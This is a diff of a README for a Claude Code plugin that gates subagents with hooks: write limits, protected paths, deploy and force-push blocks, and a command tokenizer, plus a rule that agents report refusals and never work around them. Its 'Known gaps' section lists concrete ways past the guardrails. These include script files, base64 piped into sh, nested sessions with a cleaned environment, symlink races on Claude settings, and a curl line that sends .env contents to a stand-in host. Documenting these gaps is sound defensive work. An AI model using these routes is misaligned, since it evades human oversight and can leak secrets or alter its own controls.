@@ -96,6 +96,7 @@ You are the team's social media manager. ...
 | `does` | one line | What the Chief of Staff reads about the role. Missing: the description's first sentence (a folded `description: >` block is read too). A file with neither is a problem |
 | `order` | a whole number | Where the agent sits in its department's list, lowest first (the shipped roles use 10, 20, ...). Without it, after the numbered ones, by name |
 | `write-limit` | `none`, `no-scripts`, `md-only` | `md-only`: only `.md` reports and notes. `no-scripts`: no scripts, build or deploy config (`.js`, `.ts`, `.py`, `.sh`, `wrangler.*`, `package.json`, CI files...); styles, HTML and component markup are fine. It can only **tighten**: the shipped roles keep the limits in the plugin's code (see below) whatever their file says. **A new role must state it**: a role that is not one of the twelve shipped ones and states no `write-limit` writes only `.md` |
+| `write-dirs` | project folders, comma-separated | Folders at the top of the project this role may write any file into despite its write limit. Honoured only as far as `FLOOR` in the code allows: today only `reverse-engineer`, for `research` and `captures` |
 | `limit-hint` | one line, quoted | Added to the role's denial message ("Describe the technique in your report; ...") |
 | `can-deploy` | `true` | Honoured **only** for a role the plugin's code allows to deploy (today only `devops-engineer`), and only as the exact type `chief-of-staff:<name>`. A new role gets deploy rights only by being added to `FLOOR` in `hooks/register.ts`, a code change on purpose |
 | `checked-by` | role names, comma-separated | Adds a routing line "`<role>`'s output goes to `<checker>` before it is called done" |
@@ -134,7 +135,10 @@ Your main session is the Chief of Staff. These things make it delegate:
   refused with a note to hand the work to an agent. Agents can still change files. This is the only rule
   `/delegate off` lifts.
 - **Role limits**, from the floor and each agent's frontmatter. `reverse-engineer` and `creative-director`
-  are `md-only`; `web-designer` is `no-scripts`. The same limits apply to MCP tools whose names write,
+  are `md-only`; `web-designer` is `no-scripts`. Write limits hold inside the project only (the session's
+  folder and below), never in temp folders (`/tmp`, `$TMPDIR`, Claude's scratchpad), so `curl -o /tmp/app.js`
+  works for every role; `reverse-engineer` may also write any file into the project's `research/` and
+  `captures/`. The same limits apply to MCP tools whose names write,
   download, export, generate, convert or extract files, through every argument that looks like a path,
   and (best effort) to the files a shell command writes through redirects, `tee`, `cp`, `sed -i` and the
   like. An agent whose type cannot be told gets the tightest limits (`md-only`, no deploy).
@@ -144,7 +148,10 @@ Your main session is the Chief of Staff. These things make it delegate:
   `pnpm -C site deploy`, `make deploy*`, ...), the Chief of Staff included. Rewriting git history is
   refused for everyone: `git filter-repo`, `git filter-branch`, BFG and pushes that overwrite or delete on
   the remote (`--force`, `-f`, `--mirror`, `--delete`, `-d`, `--prune`, `+branch`, `:branch`, quoted or
-  not, also after a `$(...)`); only `devops-engineer` may `git push --force-with-lease`. These checks run
+  not, an argument built from a variable or substitution or holding braces, `git send-pack --force`,
+  `git -c remote.*.push=+...` or `remote.*.mirror=true`); only `devops-engineer` may
+  `git push --force-with-lease`. Deleting a remote branch (`git push --delete`, `-d`, `:branch`) is not
+  refused: an agent asks you ("Deleting a remote branch needs the person's OK."). These checks run
   on Bash, Monitor, PowerShell and any other tool with a `command`, and on the command fields (`command`,
   `cmd`, `input`, `script`, `code`) of MCP tools that run processes, shells or code. Leaked keys are
   reported with their location and rotation steps for you to act on. A blocked agent is told who the work
@@ -152,8 +159,13 @@ Your main session is the Chief of Staff. These things make it delegate:
 - **How commands are read.** A small tokenizer walks each command once: quotes and escapes (`"git"`,
   `\git`), `$(...)` and backticks, `bash -c`, `eval`, heredocs fed to a shell, `find -exec`, and wrappers
   (`sudo`, `env`, `timeout`, `nice`, `setsid`, `stdbuf`, `ionice`, `xargs`, `npx`, `bunx`, `pnpm exec`,
-  `npm exec`, `bun x`, `node <script>`). Nothing in it backtracks. A command over 16 KB is not read: an
-  agent's asks you (or is refused where nobody can be asked), the Chief of Staff's is refused.
+  `npm exec`, `bun x`, `node <script>`, `time`, `su -c`, `runuser`, `flock`, `taskset`, `chrt`,
+  `script -c`, `parallel`, `trap`), `$'...'` and `$"..."`, here-strings fed to a shell. Nothing in it
+  backtracks, and one work budget covers the whole command, nested parses included (2,000 simple
+  commands, 64 KB scanned, 6 levels deep). A command over 16 KB or over the budget is not read: an
+  agent's asks you (or is refused where nobody can be asked), the Chief of Staff's is refused with "Split
+  it into shorter commands." A script an interpreter runs (`node ~/.claude/plugins/.../draw.mjs`,
+  `python3 ~/.claude/skills/.../build.py`) is read, not written: it runs for every agent.
 - **Protected paths.** No agent may write: this plugin's own folder (its real path too); installed plugins
   and their store (`.claude/plugins/`); Claude Code's settings (`.claude/settings*.json`), agents, skills,
   commands, hooks and output styles in any `.claude` folder; `~/.claude/CLAUDE.md`, `~/.claude.json`, any
@@ -164,8 +176,13 @@ Your main session is the Chief of Staff. These things make it delegate:
   `mv`, `install`, `ln`, `rsync`, `dd of=`, `curl -o`, `wget -O`, `tar -x -C`, `unzip -d`, `sed -i`,
   `perl -i`, `touch`, `rm`, `git -C <dir> pull`, ..., after any `cd`): a protected destination, or one
   under a folder named like this plugin (`chief-of-staff/...`, which also covers a `--plugin-dir` checkout),
-  is refused. A write it cannot follow (an inline `python -c` or `node -e`, a script, a variable in the
-  destination) is refused when the command mentions `.claude` with plugins, settings, agents, skills,
+  is refused. So is a write into a protected folder or any `.claude` folder (`cp x ~/.claude/`,
+  `mv x ~/.claude`, `cp -t`, `rsync`, `unzip -d`, `tar -C`, `ln`), where each source's landing path is
+  checked too; `<>` counts as a write, and attached values (`-C/x`, `-o/x`) are read. Destinations are
+  resolved through their nearest existing folder. After a `cd` that cannot be followed (to a variable or
+  glob, `cd -`, `popd`, `CDPATH=`) the folder is unknown. A write it cannot follow (inline code in
+  `python -c` or `node -e`, a variable in the destination, a relative write after such a `cd`) is refused
+  when the command mentions `.claude` with plugins, settings, agents, skills,
   commands, hooks or CLAUDE.md, or `.claude.json`, `.mcp.json`, managed settings or the plugin's folder.
   Plain reads pass (`grep x chief-of-staff/hooks/gate.ts > /tmp/out`): only the destination counts.
 - **Departments.** Agents of a department that is off cannot be assigned (see `/team`).
@@ -180,6 +197,13 @@ Your main session is the Chief of Staff. These things make it delegate:
     `merged`, `pushed`) are not actions. The server's own name in front is dropped (`slack_read_channel`)
     unless it is itself an action word. The engine's own read-only word counts only when the name holds
     no action word (create, update, set, share, write, make, delete, send, post, ...). Anything unknown asks.
+  - REA (`mcp__plugin_rea_rea__*`, `mcp__rea__*`): its analysis and read tools pass (`binary_overview`,
+    `list_procedures`, `procedure_pseudo_code`, `search_strings`, `get_call_graph`, `inspect_*`,
+    `read_bytes`, `xrefs`, `analyze_*`, `trace_application_feature`, `compare_application_versions`,
+    `capture_web_screenshot`, `open_binary`, ...). These ask: `set_*`, `update_*`, `annotate_*`, comments
+    and bookmarks, `push_adb_file`, `install_`/`uninstall_adb_package`, `start_`/`stop_adb_*`,
+    `execute_rizin_command`, Frida sessions and scripts (`instrument_with_frida`, `load_frida_script`, ...),
+    `gdb_console`, `rizin_debug_command`, `cutter_command`, `import_*` and recording unknowns.
   - Named read tools pass on their own servers: Scrapling's fetch and session tools (`make_request`,
     `open_request_session`, `session_make_request`, `browser_open`, `browser_close`, `browser_fetch`,
     `stealthy_fetch`, `bulk_*`, `close_session`, `list_sessions`); Gmail's `label_*`, `unlabel_*`,
@@ -214,7 +238,10 @@ Your main session is the Chief of Staff. These things make it delegate:
     override header), publish a package (`npm publish`), move a branch ref (`git update-ref refs/heads/...`,
     `git branch -f|-D main`), send data to another host with `curl`, `wget`, `http` or `xh` (a non-GET
     method, `-d`, `--data*`, `-F`, `--upload-file`, `--json`; localhost is fine; `wget -T` and `-nd` are not
-    uploads), or write a project's `CLAUDE.md`.
+    uploads; local means `localhost`, `*.localhost`, `127.*`, `[::1]`, `0.0.0.0` and
+    `host.docker.internal`), delete a remote branch, run a program named by a variable or substitution
+    (`$(which claude)`, `$c`), use `env -S`, hide `CLAUDECODE` (`env -u`, `unset`), or write a project's
+    `CLAUDE.md`.
   - The Chief of Staff itself is not gated: it asks you in the conversation.
 - **Instructions.** A "Chief of Staff" section in the main session's instructions, generated each message:
   the team grouped by department (only departments that are on and have assignable agents), the
@@ -226,38 +253,66 @@ Your main session is the Chief of Staff. These things make it delegate:
 It still answers plain questions itself. The status line shows `Chief of Staff: delegating` while the
 rule is on. Turn it off and on per machine with `/delegate off` and `/delegate on`; `/delegate` shows the
 settings, and `/delegate credits ask` or `/delegate credits free` sets generation credits. `/delegate`
-and `/team` change settings only when you run them yourself (typed at the prompt, through Remote Control,
-or your own `claude -p`), not when a plugin, a schedule or another session runs them.
+and `/team` loosen a setting (`/delegate off`, `/delegate credits free`, `/team on ...`, a `/team reset`
+that turns a department on) only when you type it at the prompt or send it through Remote Control: not
+from `claude -p`, a plugin, a schedule or another session. Tightening works from anywhere. A Claude Code
+session started from inside another one (Claude Code sets `CLAUDECODE` or `CLAUDE_CODE_CHILD_SESSION` for
+what it runs) is held to agent limits throughout, its main session included, and cannot loosen anything.
+
+**When a guardrail refuses something legitimate**, every agent and the Chief of Staff are told to stop and
+report the exact refusal, and never to work around it (for example by writing the command to a script
+file and running it). Tell the person the refusal; they decide.
 
 ### Known gaps
 
-These guardrails catch mistakes and the easy prompt-injection routes. They do not contain a determined
-agent. Real containment is the environment's network policy and Claude Code's permission mode and rules.
-Known ways past them, by design or not yet handled:
+**These hooks are guardrails against mistakes and prompt injection, not containment.** They catch the
+easy routes; they do not stop a determined agent. Real containment is Claude Code's permission rules and
+mode plus the environment's network policy. Known ways past them, by design or not yet handled:
 
 - **Hooks not loaded.** Nothing here runs if Claude Code does not load the hooks module (see the next section).
-- **A program named by a variable or alias**: `c=claude; $c -p x`, `g=git; $g push -f`,
-  `git -c alias.p="push --force" p`, a git alias in config.
-- **Encoded or indirect commands**: base64 piped into `sh`, text piped into a shell
-  (`echo wrangler deploy | sh`), a command written to a script file and run, `python -c "os.system(...)"`,
+- **The script-file route, for every shell rule and the bypass rule.** A script file that an agent writes
+  and then runs (`bash x.sh`, `python3 x.py`, `node x.mjs`) is read, not checked: whatever it does inside
+  (a force push, a deploy, a protected write, a bot-protection bypass, sending data out) is not seen. The
+  agents are told never to do this when a guardrail refuses them; that instruction is the only guard.
+- **A nested Claude Code launched in a way the gate cannot see**: from a script file, through an alias,
+  an encoded command, or a program whose name the tokenizer does not resolve. One started from Claude
+  Code's shell is held to agent limits by `CLAUDECODE`; one whose environment has been cleaned is not.
+- **Programs named indirectly**: shell aliases (`alias p='git push -f'`), functions, `gh alias`, git
+  aliases (`git -c alias.p="push --force" p`, aliases in git config), brace expansion of the command word
+  (`{git,push,-f}`), `BASH_ENV`. (A variable or substitution as the command name asks.)
+- **Encoded or indirect commands**: base64 into `sh`, text piped into a shell (`echo cmd | sh`,
+  `bash -s`), process substitution (`bash <(...)`, `source <(...)`), `xargs` fed the command, `awk`'s
+  `system()`, `make -f` from a here-string, `ssh host 'cmd'`, `python -c "os.system(...)"`,
   `node -e "child_process..."`, MCP code runners (`run_code`) whose code is not a shell command.
-- **A force push whose refspec comes from a substitution or variable** (`git push origin $REF`): only a
-  substitution whose text shows a `+` or `:` is caught.
 - **Deploy tools other than** wrangler, vercel, netlify, firebase and npm/pnpm/yarn/bun/make scripts
   named `deploy*`: `terraform apply`, `kubectl apply`, `fly deploy`, `railway up`, `gcloud app deploy`,
   `aws s3 sync`, `docker push`, `heroku`, `surge`, GitHub Actions run by other means.
-- **Data sent out other ways**: a GET with data in the URL or headers (`curl "https://x/?k=$(cat .env)"`),
-  `scp`, `nc`, `git push` to a new remote, a script's own HTTP client.
+- **Data sent out other ways**: a GET with data in the URL or headers (`curl "https://x/?k=$(cat .env)"`,
+  `curl -G -d`), `curl -K config`, `scp`, `nc`, `git push` to a new remote, a script's own HTTP client.
 - **Write limits through the shell are best effort**: `web-designer` keeps Bash (its taste-skill scripts
   need it), so its `no-scripts` limit holds for Edit, Write and MCP file tools, and for the shell only
   where the tokenizer sees the destination (redirects, `tee`, `cp`, `sed -i`, ...), not for a script or
   interpreter that writes files itself. The same holds for `md-only` roles that have Bash.
-- **Protected writes the tokenizer cannot see**: a destination built from a variable or substitution in a
-  command that does not otherwise name the protected place (`D=$(echo ...|base64 -d); cp x $D/store`), a
-  relative path written from inside the plugin's own folder (`echo x > hooks/register.ts` with the
-  plugin folder as the working directory), or a write by a script file.
-- **MCP tool names are a guess**: a server may name an acting tool like a read (`list_to_inbox`); the
-  allow-list errs towards asking, but a misleading name can pass.
+- **Protected writes the checks cannot see**:
+  - symlink races and time-of-check/time-of-use: `ln -s ~/.claude /tmp/cc; echo x > /tmp/cc/settings.json`
+    in one command (the link does not exist yet when the command is checked), or a link swapped after
+    the check;
+  - a glob destination or `cd` target that does not spell `.claude` (`cd ~/.clau*`), a destination built
+    from a variable or substitution in a command that does not otherwise name the protected place
+    (`D=$(echo ...|base64 -d); cp x $D/store`), a `cd` that fails at run time;
+  - a relative path written from inside the plugin's own folder when the session's folder is not known;
+  - `xxd -r`, `patch`, `git apply` and other tools that write files the tokenizer does not list;
+  - inline code that builds the path (`open('/root/.cl'+'aude/settings.json','w')`);
+  - an archive extracted into a folder that is not itself protected but holds one (`unzip x -d ~` that
+    creates `~/.claude/...`).
+- **Places that run code but are not protected**: scripts that `settings.json` runs (status line, hooks
+  scripts outside `.claude/hooks/`), `.git/hooks/` and `.git/config` (`core.hooksPath`, `core.sshCommand`),
+  shell rc files (`~/.bashrc`, `~/.profile`, `~/.zshrc`), `~/.claude/keybindings.json` and other files in
+  `~/.claude` that are not settings, agents, skills, commands, hooks, plugins, `CLAUDE.md` or output styles.
+- **MCP**: tool names are a guess, so a server may name an acting tool like a read (`list_to_inbox`); the
+  allow-list errs towards asking, but a misleading name can pass. Paths are read from keys that name paths
+  and from strings that look like paths; a path hidden elsewhere in an argument is not seen. MCP tools
+  that read are not path-checked.
 - **The confirm gate trusts Claude Code's approver**: it asks only when the engine says a person will
   answer, and refuses otherwise.
 
